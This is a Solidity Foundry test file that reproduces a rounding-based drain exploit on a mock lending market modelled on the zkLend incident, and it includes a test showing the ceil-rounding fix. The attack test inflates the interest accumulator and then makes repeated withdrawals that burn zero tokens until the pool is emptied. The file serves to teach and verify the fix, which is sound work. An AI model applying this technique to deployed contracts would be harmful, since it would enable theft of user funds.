// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/Underlying.sol";
import "../src/Market.sol";
import "../src/MarketFixed.sol";

contract ZklendTest is Test {
    uint256 constant RAY = 1e27;
    address honest = makeAddr("honestLP");
    address attacker = makeAddr("attacker");
    Underlying asset;

    function setUp() public { asset = new Underlying(); }

    // ACT 1 — HONEST: normal deposit/withdraw round-trips 1:1 while acc = 1.0
    function test_1_honest() public {
        Market m = new Market(asset);
        _fund(honest, 100e18);
        vm.startPrank(honest);
        asset.approve(address(m), type(uint256).max);
        m.deposit(100e18);          // acc = 1.0, so 100 underlying -> 100 zTokens
        m.withdraw(100e18);         // and 100 zTokens -> 100 underlying, exactly
        vm.stopPrank();
        console.log("HONEST: deposited 100, got back", asset.balanceOf(honest)/1e18);
        assertEq(asset.balanceOf(honest), 100e18);
        assertEq(m.underlyingBalance(), 0);
    }

    // ACT 2 — ATTACK: inflate the accumulator on the (dust) market, then withdraw
    // large amounts that floor-round to ZERO zTokens burned -> free drain.
    function test_2_drain() public {
        Market m = new Market(asset);
        _fund(honest, 100e18);
        vm.startPrank(honest); asset.approve(address(m), type(uint256).max); m.deposit(100e18); vm.stopPrank();  // honest liquidity: pool = 100
        console.log("BEFORE: pool", m.underlyingBalance()/1e18, "attacker", asset.balanceOf(attacker)/1e18);

        // the Feb-2025 move: flash-loan-driven interest inflates the accumulator on a
        // near-empty market. We model the inflated value directly (acc = 20e18 * RAY).
        m._inflateAccumulator(20e18 * RAY);

        // attacker withdraws just under one zToken's worth (20e18) each call ->
        // burned = floor(20e18 * RAY / acc) = 0 zTokens. Repeat to drain the pool.
        vm.startPrank(attacker);
        for (uint i; i < 5; i++) {
            m.withdraw(20e18 - 1);
            console.log("  cycle", i+1, "attacker zBalance still", m.zBalance(attacker));
        }
        vm.stopPrank();

        console.log("AFTER: pool", m.underlyingBalance()/1e18, "attacker", asset.balanceOf(attacker)/1e18);
        assertLt(m.underlyingBalance(), 6);            // pool drained to dust
        assertGt(asset.balanceOf(attacker), 99e18);    // attacker took ~100 for 0 zTokens
    }

    // ACT 3 — FIX: withdraw rounds burned zTokens UP -> a free withdrawal reverts
    function test_3_fixed() public {
        MarketFixed m = new MarketFixed(asset);
        _fund(honest, 100e18);
        vm.startPrank(honest); asset.approve(address(m), type(uint256).max); m.deposit(100e18); vm.stopPrank();
        m._inflateAccumulator(20e18 * RAY);
        vm.prank(attacker);
        vm.expectRevert();                             // ceil burns >=1 zToken; attacker has 0 -> underflow revert
        m.withdraw(20e18 - 1);
        console.log("FIXED: free withdrawal reverts; pool intact", m.underlyingBalance()/1e18);
        assertEq(m.underlyingBalance(), 100e18);
    }

    function _fund(address who, uint256 amt) internal {
        asset.mint(who, amt);
    }
}
